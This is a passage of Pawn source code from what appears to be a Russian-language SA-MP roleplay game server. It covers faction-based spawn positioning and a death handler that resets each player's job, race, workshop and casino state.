				else if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 1)
				{
					SetPVarInt(playerid, "podeezd", kvartinfo[PlayerInfo[playerid][pKvartiraKey]][virtmir]);
					SetPlayerPos(playerid,31.3584,-84.8000,1004.2859);
					SetPlayerInterior(playerid,15);
					SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pKvartiraKey]);
					return true;
				}
				else if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 2)
				{
					SetPVarInt(playerid, "podeezd", kvartinfo[PlayerInfo[playerid][pKvartiraKey]][virtmir]);
					SetPlayerPos(playerid,58.2073,-79.1497,1004.2859);
					SetPlayerInterior(playerid,15);
					SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pKvartiraKey]);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		}
		if(!HGet(playerid) && !KGet(playerid) && (PlayerInfo[playerid][pSpawnChange][0] == 0 || PlayerInfo[playerid][pSpawnChange][1] == 0)) PlayerInfo[playerid][pSpawnChange][0] = 1,PlayerInfo[playerid][pSpawnChange][1] = 1;
		if(GetPVarInt(playerid,"Fraction_Duty"))
		{
		    if(PlayerInfo[playerid][pSpawnChange][1] == 1)
			switch(PlayerInfo[playerid][pMember])
			{
			case 1:
				{
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 1210.8560,1356.6703,3011.1123);
					SetPlayerFacingAngle(playerid, 174.4006);
					SetPlayerVirtualWorld(playerid, 4);
					SetPVarInt(playerid, "inUchastok", 1);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 2:
				{
					SetPlayerInterior(playerid, 3);
					SetPlayerPos(playerid, -2462.2571,506.4978,1039.1460);
					SetPlayerFacingAngle(playerid, 90.000);
					SetPlayerVirtualWorld(playerid, 130);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 3:
				{
					if(forma[playerid] == 1)
					{
						SetPlayerSkin(playerid, 252);
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid, -1346.2050,492.3983,11.2027);
						SetPlayerVirtualWorld(playerid, 0);
						SetCameraBehindPlayer(playerid);
						return true;
					}
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, -1371.6482,492.1947,11.1953);
					SetPlayerVirtualWorld(playerid, 0);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 4:
				{
					if(PlayerInfo[playerid][pJobHeal] == 1) // SF
					{
						SetPlayerInterior(playerid, 15);
						SetPlayerVirtualWorld(playerid, 3);
						SetPlayerPos(playerid, 303.7660,169.1190,1214.7949);
						SetPlayerFacingAngle(playerid, 269.1964);
					    SetCameraBehindPlayer(playerid);
					}
					else if(PlayerInfo[playerid][pJobHeal] == 2) // LS
					{
						SetPlayerInterior(playerid, 15);
						SetPlayerVirtualWorld(playerid, 4);
						SetPlayerPos(playerid, 303.7660,169.1190,1214.7949);
						SetPlayerFacingAngle(playerid, 269.1964);
						SetCameraBehindPlayer(playerid);
					}
					else if(PlayerInfo[playerid][pJobHeal] == 3)// LV
					{
						SetPlayerInterior(playerid, 15);
						SetPlayerVirtualWorld(playerid, 5);
						SetPlayerPos(playerid, 303.7660,169.1190,1214.7949);
						SetPlayerFacingAngle(playerid, 269.1964);
						SetCameraBehindPlayer(playerid);
					}
					else if(PlayerInfo[playerid][pJobHeal] == 4)// FC
					{
						SetPlayerInterior(playerid, 15);
						SetPlayerVirtualWorld(playerid, 6);
						SetPlayerPos(playerid, 303.7660,169.1190,1214.7949);
						SetPlayerFacingAngle(playerid, 269.1964);
						SetCameraBehindPlayer(playerid);
					}
					else if(PlayerInfo[playerid][pJobHeal] == 5)// CGH
					{
						SetPlayerInterior(playerid, 15);
						SetPlayerVirtualWorld(playerid, 7);
						SetPlayerPos(playerid, 303.7660,169.1190,1214.7949);
						SetPlayerFacingAngle(playerid, 269.1964);
						SetCameraBehindPlayer(playerid);
					}
					return true;
				}
			case 7:
				{
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 862.6194,342.2870,1081.7729);
					SetPlayerFacingAngle(playerid, 296.2379);
					SetPlayerVirtualWorld(playerid, 1);
					useguns[playerid] = 0;
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 8:
				{
					SetPlayerInterior(playerid, 1);
					SetPlayerPos(playerid, 2151.4502,1602.8522,1006.1752);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 269.7087);
					SetPlayerVirtualWorld(playerid, 0);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 9:
				{
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, -2066.8550,463.0319,191.0859);
					SetPlayerVirtualWorld(playerid, 2);
					gNews[playerid] = 0;
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 10:
				{
					SetPlayerInterior(playerid, 10);
					SetPlayerPos(playerid, 222.0488,111.5337,1010.2118);
					SetPlayerFacingAngle(playerid, 268.9050);
					SetPlayerVirtualWorld(playerid, 0);
					SetPVarInt(playerid, "inUchastok", 1);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 11:
				{
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 2352.1335,1667.7944,3040.9275);
					SetPlayerVirtualWorld(playerid, 7);
					SetPlayerFacingAngle(playerid, 137.5284);
					SetCameraBehindPlayer(playerid);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 16:
				{
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 1641.5293,-1633.2429,101.0859);
					SetPlayerFacingAngle(playerid, 359.8156);
					SetPlayerVirtualWorld(playerid, 1);
					lNews[playerid] = 0;
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 19:
				{
					if(forma[playerid] == 1)
					{
						SetPlayerSkin(playerid, 252);
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid, 241.7503,1852.6790,8.7578);
						SetPlayerVirtualWorld(playerid, 0);
						SetCameraBehindPlayer(playerid);
						return true;
					}
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 241.7503,1852.6790,8.7578);
					SetPlayerVirtualWorld(playerid, 0);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 20:
				{
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 2634.1272,1214.9916,41.6859);
					SetPlayerVirtualWorld(playerid, 3);
					LvNews[playerid] = 0;
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 21:
				{
					SetPlayerInterior(playerid, 3);
					SetPlayerPos(playerid, 228.6151,180.0210,1003.0313);
					SetPlayerFacingAngle(playerid, 86.629);
					SetPlayerVirtualWorld(playerid, 122);
					SetPVarInt(playerid, "inUchastok", 1);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 22:
				{
					SetPlayerInterior(playerid, 15);
					SetPlayerVirtualWorld(playerid, 4);
					SetPlayerPos(playerid, 372.0985,-53.2946,1076.4708);
					SetPlayerFacingAngle(playerid, 90.0000);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 33:
				{
					SetPlayerInterior(playerid, 15);
					SetPlayerVirtualWorld(playerid, 5);
					SetPlayerPos(playerid, 372.0985,-53.2946,1076.4708);
					SetPlayerFacingAngle(playerid, 90.0000);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 34:
				{
					SetPlayerInterior(playerid, 3);
					SetPlayerVirtualWorld(playerid, 1);
					SetPlayerPos(playerid, 1491.0817,1306.0920,1093.2964);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		}
		switch(PlayerInfo[playerid][pMember])
		{
		case 3:
			{
				if(PlayerInfo[playerid][pRank] < 3)
				{
					SetPVarInt(playerid,"Fraction_Duty",1);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SCM(playerid, COLOR_BLUE,"Рабочий день начат");
					SetPlayerToTeamColor(playerid);
					if(forma[playerid] == 1)
					{
						SetPlayerSkin(playerid, 252);
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid, -1346.2050,492.3983,11.2027);
						SetPlayerVirtualWorld(playerid, 0);
						SetCameraBehindPlayer(playerid);
						return true;
					}
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, -1371.6482,492.1947,11.1953);
					SetPlayerVirtualWorld(playerid, 0);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 19:
			{
				if(PlayerInfo[playerid][pRank] < 3)
				{
					SetPVarInt(playerid,"Fraction_Duty",1);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SCM(playerid, COLOR_BLUE,"Рабочий день начат");
					SetPlayerToTeamColor(playerid);
					if(forma[playerid] == 1)
					{
						SetPlayerSkin(playerid, 252);
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid, 241.7503,1852.6790,8.7578);
						SetPlayerVirtualWorld(playerid, 0);
						SetCameraBehindPlayer(playerid);
						return true;
					}
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 241.7503,1852.6790,8.7578);
					SetPlayerVirtualWorld(playerid, 0);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 5:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 5);
					SetPlayerPos(playerid, 1265.7104,-793.7453,1084.0078);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerVirtualWorld(playerid, 2);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 6:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 5);
					SetPlayerPos(playerid, 1265.7104,-793.7453,1084.0078);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerVirtualWorld(playerid, 0);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 12:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerPos(playerid, -61.2984,1364.5847,1080.2109);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 100);
					SetPlayerInterior(playerid,6);
					SetPlayerVirtualWorld(playerid, 34);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 13:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 4);
					SetPlayerVirtualWorld(playerid, 75);
					SetPlayerFacingAngle(playerid, 358.0241);
					SetPlayerPos(playerid, 2795.6206,-1605.5884,-36.9231);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 14:
			{
				if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 5);
					SetPlayerPos(playerid, 1265.7104,-793.7453,1084.0078);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerVirtualWorld(playerid, 1);
					GiveWeapon(playerid,1,2);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 15:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 3);
					SetPlayerVirtualWorld(playerid, 0);
					SetPlayerPos(playerid,  2496.012939,-1708.923217,1014.742187);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 0.191693);
					SetPlayerVirtualWorld(playerid, 1);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 17:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerFacingAngle(playerid, 90.4248);
					SetPlayerPos(playerid, -49.7558,1400.3553,1084.4297);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerInterior(playerid,8);
					SetPlayerVirtualWorld(playerid, 36);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 18:
			{
				if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 8);
					SetPlayerVirtualWorld(playerid, 63);
					SetPlayerPos(playerid, 2808.9631,-1169.0806,1025.5703);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					RemovePlayerAttachedObject(playerid, 1);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 23:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 2);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 24:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 52);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 25:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 4);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 26:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerVirtualWorld(playerid, 998);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 27:
			{
				if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 6);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 28:
			{
				if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 7);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 29:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 8);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 30:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 9);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 31:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 10);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 32:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 11);
					SetPlayerPos(playerid, 508.3728,-78.6393,998.9609);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerFacingAngle(playerid, 7.3397);
					SetPlayerVirtualWorld(playerid, 11);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		case 34:
			{
			    if(PlayerInfo[playerid][pSpawnChange][1] != 0)
			    {
					SetPlayerInterior(playerid, 3);
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerVirtualWorld(playerid, 1);
					SetPlayerPos(playerid, 1491.0817,1306.0920,1093.2964);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		}
	}
//	if(!GetPVarInt(playerid, "Fraction_Duty") && PlayerInfo[playerid][pSpawnChange][0] == 1)
	switch(PlayerInfo[playerid][pLevel])
	{
	case 1..2:
		{
			SetPlayerPos(playerid, 1154.3717, -1769.2594, 16.5938);
			SetPlayerFacingAngle(playerid, 0.6853);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid, 0);
		}
	case 3..5:
		{
			SetPlayerPos(playerid, -1967.2679,115.1929,27.6875);
			SetPlayerFacingAngle(playerid, 1.3365);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid, 0);
		}
	case 6..1000:
		{
			SetPlayerPos(playerid, 2848.7043,1294.0205,11.3906);
			SetPlayerFacingAngle(playerid, 90.0000);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid, 0);
		}
	}
	SetCameraBehindPlayer(playerid);
	return true;
}
public OnPlayerDeath(playerid, killerid, reason)
{
	DelGun(playerid);
	if(robscdtimer[playerid] != -1)
	{
		KillTimer(robscdtimer[playerid]);
		robscdtimer[playerid] = -1;
	}
	if(SERVERTEST) SendMes(killerid,COLOR_BLUE,"DEATH: PLAYERID - %i, KILLERID - %i, REASON - %i",playerid,killerid,reason);
 	new animlib[32], animname[32];
    GetAnimationName(AnimTheLost[playerid],animlib,32,animname,32);
    if(strcmp(animlib, "PED", true) != 0) ClearAnimations(playerid);
	SetPVarInt(playerid,"CarSpWarn",0);
	new GotPVar = GetPVarInt(playerid, "VrConvoi");
	if(cuffto[playerid] != 9999)
	{
		TogglePlayerControllable(cuffto[playerid], 1);
		SetPlayerSpecialAction(cuffto[playerid],SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(cuffto[playerid],0);
		PlayerCuffed[cuffto[playerid]] = 0;
		PlayerCuffedTime[cuffto[playerid]] = 0;
		cuffto[playerid] = 9999;
	}
    if(Convoi[playerid] != 9999)
    {
        SetPVarInt(Convoi[playerid], "VrConvoi", -1);
        KillTimer(TimerForPlayer[playerid]);
        SCM(Convoi[playerid], COLOR_GREY, " Ваш заключенный мертв");
        TimerForPlayer[playerid] = INVALID_PLAYER_ID;
        Convoi[playerid] = 9999;
    }
    else if(GotPVar != -1)
    {
        SetPVarInt(playerid, "TempConvoi", -1);
        KillTimer(TimerForPlayer[GotPVar]);
        SCM(Convoi[playerid], COLOR_GREY, " Ваш конвой мертв");
        TimerForPlayer[GotPVar] = INVALID_PLAYER_ID;
        Convoi[GotPVar] = 9999;
    }
	if(GetPVarInt(playerid,"player_paint") == 2)
	{
		SetPVarInt(playerid,"paintdeaths",GetPVarInt(playerid,"paintdeaths")+1);
		if(killerid != INVALID_PLAYER_ID)
		{
			GameTextForPlayer(killerid, "~w~Kills +1", 5000, 1);
			if(playerid != killerid){ SetPVarInt(killerid,"paintkills",GetPVarInt(killerid,"paintkills")+1); }
		}
	}
	if(race_info[1] > 1 && GetPVarInt(playerid,"gonka") != 0)
	{
		DestroyVehicle(RaceInfo[GetPVarInt(playerid,"gonka")-1][rCar]);
		DeletePVar(playerid,"gonka");
		SCM(playerid,COLOR_LIGHTRED," Вы были дисквалифицированы!");
	}
	if(GetPVarInt(playerid,"farm_id"))
	{
		DisablePlayerCheckpoint(playerid);
		RemovePlayerAttachedObject(playerid,3);
		DeletePVar(playerid,"farm_id");
		DeletePVar(playerid,"farm_status");
		DeletePVar(playerid,"farm_rank");
		DeletePVar(playerid,"farm_zp");
	}
	if(GetPVarInt(playerid,"h_contract"))
	{
		DeletePVar(playerid,"h_contract");
		DeletePVar(playerid,"h_price");
		if(GetPVarInt(playerid,"h_stall"))
		{
			UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], 0xFF8C37FF,"Не работает");
			DeletePVar(playerid,"h_stall");
		}
	}
	if(GetPVarInt(playerid,"w_id"))
	{
		new null = -1, x = GetPVarInt(playerid,"w_id");
		for(new x_ = 9; x_ >= 0; x_--) if(strcmp(WorkshopList[x_][x][wlName],PlayerInfo[playerid][pName],true) == 0 && strlen(WorkshopList[x_][x][wlName])) null = x_;
		if(null != -1)
		{
			for(new x_ = null; x_ < 9; x++)
			{
				WorkshopList[x_][x][wlID] = WorkshopList[x_+1][x][wlID];
				strmid(WorkshopList[x_][x][wlName],WorkshopList[x_+1][x][wlName],0,strlen(WorkshopList[x_][x][wlName]), MAX_PLAYER_NAME);
				WorkshopList[x_+1][x][wlID] = -1;
				strmid(WorkshopList[x_+1][x][wlName],"", 0, strlen(""), 5);
			}
			if(null == 0 && strlen(WorkshopList[0][x][wlName]))
			{
				DisablePlayerCheckpoint(playerid);
				SCM(WorkshopList[0][x][wlID],COLOR_BLUE,"Подошла ваша очередь. У вас есть 2 минуты что бы прибыть к гаражу!");
				SetPVarInt(WorkshopList[0][x][wlID],"w_time", gettime() + 120);
				SetPlayerCheckpoint(WorkshopList[0][x][wlID],WorkshopInfo[x][wMenu][0],WorkshopInfo[x][wMenu][1],WorkshopInfo[x][wMenu][2], 10.0);
			}
			DeletePVar(playerid,"w_time");
			DeletePVar(playerid,"w_id");
		}
	}
	if(GetPVarInt(playerid,"InWorkshop") > 0)
	{
		DeletePVar(playerid,"cost");
		DeletePVar(playerid,"prods");
		DeletePVar(playerid,"detals");
		DeletePVar(playerid,"color0");
		DeletePVar(playerid,"color1");
		DeletePVar(playerid,"w_id");
		DeletePVar(GetPVarInt(playerid,"mechanic"),"installation");
		SetPlayerVirtualWorld(GetPVarInt(playerid,"mechanic"),0);
		t_SetPlayerPos(GetPVarInt(playerid,"mechanic"),WorkshopInfo[GetPVarInt(playerid,"InWorkshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"InWorkshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"InWorkshop")][wMenu][2]);
		DeletePVar(GetPVarInt(playerid,"mechanic"),"installation_");
		DeletePVar(playerid,"mechanic");
		DeletePVar(playerid,"InWorkshop");
	}
	if(GetPVarInt(playerid,"Workshop") > 0)
	{
		if(GetPVarInt(GetPVarInt(playerid,"installation_"),"InWorkshop") > 0)
		{
			DeletePVar(GetPVarInt(playerid,"installation_"),"cost");
			DeletePVar(GetPVarInt(playerid,"installation_"),"prods");
			DeletePVar(GetPVarInt(playerid,"installation_"),"detals");
			DeletePVar(GetPVarInt(playerid,"installation_"),"color0");
			DeletePVar(GetPVarInt(playerid,"installation_"),"color1");
			DeletePVar(GetPVarInt(playerid,"installation_"),"w_id");
			SetPlayerVirtualWorld(GetPVarInt(playerid,"installation_"),0);
			if(!IsPlayerInAnyVehicle(GetPVarInt(playerid,"installation_")))
			{
				t_SetPlayerPos(GetPVarInt(playerid,"installation_"),WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
				SetVehiclePos(house_car[GetPVarInt(playerid,"installation_")],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
				PutPlayerInVehicleEx(GetPVarInt(playerid,"installation_"),house_car[GetPVarInt(playerid,"installation_")],0);
				SetPlayerVirtualWorld(GetPVarInt(playerid,"installation_"),0);
			}
			else
			{
				if(GetPVarInt(playerid,"Workshop") == 1) SetVehiclePos(GetPlayerVehicleID(GetPVarInt(playerid,"installation_")),WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(GetPVarInt(playerid,"installation_")),0);
			}
			SCM(GetPVarInt(playerid,"installation_"),COLOR_LIGHTRED,"Механик вышел из игры!");
			DeletePVar(GetPVarInt(playerid,"installation_"),"mechanic");
			DeletePVar(GetPVarInt(playerid,"installation_"),"InWorkshop");
		}
		DeletePVar(playerid,"installation");
		DeletePVar(playerid,"installation_");
		DeletePVar(playerid,"Workshop");
		PlayerInfo[playerid][pPayCheck]+=GetPVarInt(playerid,"Workshop_");
		WorkshopInfo[GetPVarInt(playerid,"Workshop")][wBank]-=GetPVarInt(playerid,"Workshop_");
		DeletePVar(playerid,"Workshop_");
		DeletePVar(playerid,"Workshop__");
	}
	if(GetPVarInt(playerid, "RStol"))
	{
		if(RouletPlay[GetPVarInt(playerid,"RStol")] == false) PlayerInfo[playerid][pCash]+=GetPVarInt(playerid,"RStavka");
		DestroyObject(GetPVarInt(playerid,"RObj"));
		DeletePVar(playerid,"RObj");
		DeletePVar(playerid,"RStavka");
		DeletePVar(playerid,"RStol");
		DeletePVar(playerid,"RX");
		DeletePVar(playerid,"RY");
		DeletePVar(playerid,"RZ");
		DeletePVar(playerid,"RXONE");
		DeletePVar(playerid,"RYONE");
		DeletePVar(playerid,"RZONE");
		DeletePVar(playerid,"RNumber");
		DeletePVar(playerid,"RNumbers");
		DeletePVar(playerid,"RNumber_");
		PlayerTextDrawHide(playerid,RouletText[playerid]);
		TogglePlayerControllableEx(playerid, true);
		SetCameraBehindPlayer(playerid);
	}
	DeletePVar(playerid,"CasinoRank");
 	FreezePlayer[playerid] = 1;
	for(new i; i < 11; i++) vidachagun[i][playerid] = 0;
	if(PlayerInfo[playerid][pJob] == 2)
	{
		if(gcontract[playerid] == 1)
		{
			Delete3DTextLabel(Meh3d[GetPlayerVehicleID(playerid)]);
			gcontract[playerid] = 0;
		}
	}
	if(reason == 38)
	{
		format(YCMDstr, sizeof(YCMDstr), " <Warning> %s[%i]: убил с минигана %s[%i] wep %i guns %i",PlayerInfo[killerid][pName],killerid,PlayerInfo[playerid][pName],playerid,GetPlayerWeapon(killerid),GetPlayerAmmo(killerid));
		ABroadCast(0xFF0000AA,YCMDstr,2);
		RemovePlayerFromVehicleAC(killerid);
	}
	TextDrawHideForPlayer(playerid, DRAP);
	SetPVarInt(playerid,"K_Times",GetPVarInt(playerid,"K_Times") + 1);
	SetPVarInt(playerid, "GunCheckTime", 2);
	new name[MAX_PLAYER_NAME];
	ebanksf[playerid] = 0;
	enterbiz[playerid] = 0;
	MehJob[playerid] = 999;
	Works[playerid] = false; JobAmmount[playerid] = 0; JobCP[playerid] = 0; Employer[playerid] = 999;
	DisablePlayerCheckpoint(playerid);
	PicCP[playerid] = 1;
	mesh[playerid] = 999;
	usemesh[playerid] = 0;
	RemovePlayerAttachedObject(playerid,1);
	RemovePlayerAttachedObject(playerid,2);
	RemovePlayerAttachedObject(playerid,3);
	RemovePlayerAttachedObject(playerid,4);
	RemovePlayerAttachedObject(playerid,0);
	arenda[playerid] = 0;
	usemats[playerid] = 0;
	zd[playerid] = 0;
	VertMats[playerid] = 0;
	tex[playerid] = 0;
	tex2[playerid] = 0;
	if(PlayerInfo[playerid][pJob] == 7) PlayerInfo[playerid][pJob] = 0;
	new weaponid;
	new gunname[25];
	GetWeaponName(weaponid, gunname, sizeof(gunname));
	forma[playerid] = 0;
	proverkaforma[playerid] = 0;
	new Float:px,Float:py,Float:pz;
	gPlayerSpawned[playerid] = 0;
	GetPlayerName(playerid, name, sizeof(name));
	if(IsPlayerInAnyVehicle(playerid)) RemovePlayerFromVehicleAC(playerid);
	GetPlayerPos(playerid, px, py, pz);
	LiveOffer[playerid] = 999;
	TalkingLive[playerid] = 255;
	LiveOfferls[playerid] = 999;
	LiveOfferlv[playerid] = 999;
	TalkingLivels[playerid] = 255;
	TalkingLivelv[playerid] = 255;
	Tel[playerid] = 255;
	if(PEfir[playerid] != 255)
	{
		SCM(playerid, -1, " Вы вышли из прямого эфира");
		PEfir[playerid] = 255;
		if(PlayerInfo[playerid][pMember] == 9 && smssf == playerid)
		{
		    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
			format(string, 128, " [SFN] %s завершил приём звонков от слушателей", Name(playerid));
			SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
			smssf = -1;
		}
		else if(PlayerInfo[playerid][pMember] == 16 && smsls == playerid)
		{
		    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
			format(string, 128, " [LSN] %s завершил приём звонков от слушателей", Name(playerid));
			SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
			smsls = -1;
		}
		else if(PlayerInfo[playerid][pMember] == 20 && smslv == playerid)
		{
		    SCM(playerid, COLOR_BLUE, " Вы завершили приём звонков от слушаталей");
			format(string, 128, " [LVN] %s завершил приём звонков от слушателей", Name(playerid));
			SendFamilyMessage(PlayerInfo[playerid][pMember],0xAF6262FF, string);
			smslv = -1;
		}
	}
	//KillTimer(Timerkk[playerid]);
	if(!IsAArm(killerid) && !IsACop(killerid) && GetPVarInt(killerid, "player_paint") != 2 && killerid != INVALID_PLAYER_ID)
	{
